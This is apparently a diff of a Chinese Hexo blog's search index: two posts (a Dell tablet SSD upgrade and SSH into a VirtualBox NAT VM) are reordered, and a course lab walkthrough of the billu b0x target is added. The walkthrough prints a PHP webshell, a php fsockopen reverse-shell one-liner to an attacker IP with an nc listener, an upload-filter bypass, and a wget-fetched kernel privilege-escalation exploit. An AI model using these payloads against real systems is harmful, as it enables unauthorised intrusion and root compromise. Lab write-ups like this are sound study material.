@@ -1,38 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
-    <url>/post/46d9de96.html</url>
-    <content><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p>
-<h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="/image/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="/image/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="/image/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="/image/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p>
-<h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure>
-
-<p>最后你的sshd服务状态应该类似于下图：<br><img src="/image/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p>
-<h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul>
-<li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p>
-</li>
-<li><p>配置密钥登录<br>如果不配置密钥，在vscode中打开一个文件夹就要输入一次密码，极其的麻烦。而且以后工作的时候肯定是使用安全的密钥登录，所以用密钥登陆是很有必要的。</p>
-<ul>
-<li><p>在cmd输入命令<code>ssh-keygen -t rsa -b 4096</code>生成一对rsa密钥(之后一直回车即可)，如果你之前已经生成了密钥了，那就用你之前的密钥就行。</p>
-</li>
-<li><p>进入<code>C/Users/你的用户名/.ssh</code>文件夹，你应该在这里能找到你之前生成的密钥对。在这里右键打开terminal，输入命令<code>scp -P 你设置的主机端口号 id_rsa.pub username@127.0.0.1:~(可以改成你想要的目录)</code>，这一步是将公钥文件传给你的虚拟机。 </p>
-</li>
-<li><p>打开你的虚拟机，找到你传入的公钥文件，输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>最后是对sshd的一些配置<br>修改<code>/etc/ssh/sshd_config</code>文件，将对应行修改成下面那样：</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PermitRootLogin prohibit-password #限制不能使用密码登录root用户</span><br><span class="line">PubkeyAuthentication yes #允许使用公钥进行登录</span><br><span class="line">PasswordAuthentication no #禁止使用密码登录</span><br><span class="line">AllowTcpForwarding yes #允许进行ssh端口的tcp转发</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>之后再进行ssh连接，你会发现直接连接成功，最后在vscode输入之前的ssh连接命令即可成功远程登陆虚拟机。</p>
-<h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><p>因为我之前已经有了rsa密钥，我把生成的新的rsa密钥命名成了自定义的名字，然后发现怎么都连接不成功。搜索后发现原来ssh会按照一定顺序扫描已有的私钥，而自定义名字的私钥是最后扫描的，导致ssh在扫描到之前就认为你的私钥已经是错误的了(居然不是遍历！！！)。<br>这种情况需要在ssh连接命令中加入参数<code>-i</code>来指定你要使用的私钥来进行连接。</p>
+    <title>DELL Latitude 5290 2in1扩展硬盘避坑</title>
+    <url>/post/4a17b156.html</url>
+    <content><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p>
+<p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p>
+<h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="/image/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p>
+<h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="/image/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p>
+<p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>
 ]]></content>
       <tags>
-        <tag>Linux</tag>
-        <tag>ssh</tag>
-        <tag>虚拟机</tag>
-        <tag>VirtualBox</tag>
+        <tag>DELL</tag>
+        <tag>搞机</tag>
+        <tag>win平板</tag>
+        <tag>避坑</tag>
       </tags>
   </entry>
   <entry>
@@ -89,9 +70,9 @@
 <p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>
 ]]></content>
       <tags>
-        <tag>Linux</tag>
         <tag>WSL2</tag>
         <tag>Windows11</tag>
+        <tag>Linux</tag>
         <tag>教程</tag>
       </tags>
   </entry>
@@ -150,19 +131,73 @@
       </tags>
   </entry>
   <entry>
-    <title>DELL Latitude 5290 2in1扩展硬盘避坑</title>
-    <url>/post/4a17b156.html</url>
-    <content><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p>
-<p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p>
-<h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="/image/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p>
-<h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="/image/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p>
-<p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>
+    <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
+    <url>/post/46d9de96.html</url>
+    <content><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p>
+<h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="/image/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="/image/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="/image/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="/image/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p>
+<h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure>
+
+<p>最后你的sshd服务状态应该类似于下图：<br><img src="/image/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p>
+<h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul>
+<li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p>
+</li>
+<li><p>配置密钥登录<br>如果不配置密钥，在vscode中打开一个文件夹就要输入一次密码，极其的麻烦。而且以后工作的时候肯定是使用安全的密钥登录，所以用密钥登陆是很有必要的。</p>
+<ul>
+<li><p>在cmd输入命令<code>ssh-keygen -t rsa -b 4096</code>生成一对rsa密钥(之后一直回车即可)，如果你之前已经生成了密钥了，那就用你之前的密钥就行。</p>
+</li>
+<li><p>进入<code>C/Users/你的用户名/.ssh</code>文件夹，你应该在这里能找到你之前生成的密钥对。在这里右键打开terminal，输入命令<code>scp -P 你设置的主机端口号 id_rsa.pub username@127.0.0.1:~(可以改成你想要的目录)</code>，这一步是将公钥文件传给你的虚拟机。</p>
+</li>
+<li><p>打开你的虚拟机，找到你传入的公钥文件，输入以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>最后是对sshd的一些配置<br>修改<code>/etc/ssh/sshd_config</code>文件，将对应行修改成下面那样：</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PermitRootLogin prohibit-password #限制不能使用密码登录root用户</span><br><span class="line">PubkeyAuthentication yes #允许使用公钥进行登录</span><br><span class="line">PasswordAuthentication no #禁止使用密码登录</span><br><span class="line">AllowTcpForwarding yes #允许进行ssh端口的tcp转发</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>之后再进行ssh连接，你会发现直接连接成功，最后在vscode输入之前的ssh连接命令即可成功远程登陆虚拟机。</p>
+<h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><p>因为我之前已经有了rsa密钥，我把生成的新的rsa密钥命名成了自定义的名字，然后发现怎么都连接不成功。搜索后发现原来ssh会按照一定顺序扫描已有的私钥，而自定义名字的私钥是最后扫描的，导致ssh在扫描到之前就认为你的私钥已经是错误的了(居然不是遍历！！！)。<br>这种情况需要在ssh连接命令中加入参数<code>-i</code>来指定你要使用的私钥来进行连接。</p>
 ]]></content>
       <tags>
-        <tag>DELL</tag>
-        <tag>搞机</tag>
-        <tag>win平板</tag>
-        <tag>避坑</tag>
+        <tag>Linux</tag>
+        <tag>ssh</tag>
+        <tag>虚拟机</tag>
+        <tag>VirtualBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络攻防实战billu b0x打靶思路</title>
+    <url>/post/b858f09.html</url>
+    <content><![CDATA[<p>写在前面：思路不同于cy老师上课讲的，故在此记录一下。</p>
+<h2 id="一、扫描端口"><a href="#一、扫描端口" class="headerlink" title="一、扫描端口"></a>一、扫描端口</h2><p>首先还是尝试非常经典的扫描端口，输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#查找靶机ip</span></span><br><span class="line">nmap -p- 10.0.2.13 -sV –min-rate 50000 –min-hostgroup 100 <span class="comment">#查找靶机暴露的端口以及其具体信息</span></span><br></pre></td></tr></table></figure>
+
+<p>发现结果如下：<br><img src="/image/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p>
+<p>尝试寻找相应的漏洞后(使用<code>searchsploit</code>命令)，没有发现可利用的漏洞，故进行到下一步。</p>
+<h2 id="二、尝试破解登录"><a href="#二、尝试破解登录" class="headerlink" title="二、尝试破解登录"></a>二、尝试破解登录</h2><ul>
+<li>首先尝试使用seclist中提供的目录来进行爆破，但是因为burpsuite没开会员，等待时间非常长，故选择放弃。</li>
+<li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="/image/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="/image/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="/image/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="/image/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="/image/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="/image/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="/image/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="/image/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="/image/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li>
+</ul>
+<h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="/image/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p>
+<ul>
+<li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="/image/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p>
+</li>
+<li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="/image/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p>
+</li>
+</ul>
+<h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="/image/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p>
+<p>如果查看<code>/in</code>网页也没有太大关系，输入以下命令可以查看靶机的内核版本以及发行版版本等各详细信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release <span class="comment">#查看发行版版本等其他信息</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来的事情就比较简单了，输入以下命令来完成内核漏洞的爆破：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在主机上：</span></span><br><span class="line">searchsploit privilege | grep 3.13 | grep linux <span class="comment">#查找可以利用的内核漏洞，发现编号为37292的文件</span></span><br><span class="line">searchsploit -m 37292 <span class="comment">#将该文件下载到本机</span></span><br><span class="line">python -m http.server:80 <span class="comment">#开启http服务方便靶机从主机下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在靶机上</span></span><br><span class="line"><span class="built_in">which</span> gcc <span class="comment">#检查运行环境，发现靶机有gcc工具，故不用管</span></span><br><span class="line">wget 10.0.2.11/37292.c <span class="comment">#从靶机上获取漏洞文件</span></span><br><span class="line">gcc 37292.c -o 37292 <span class="comment">#将.c文件编译链接为可执行文件</span></span><br><span class="line">./37292 <span class="comment">#执行文件来获得root权限</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：<br><img src="/image/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>网络攻防</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
 </search>
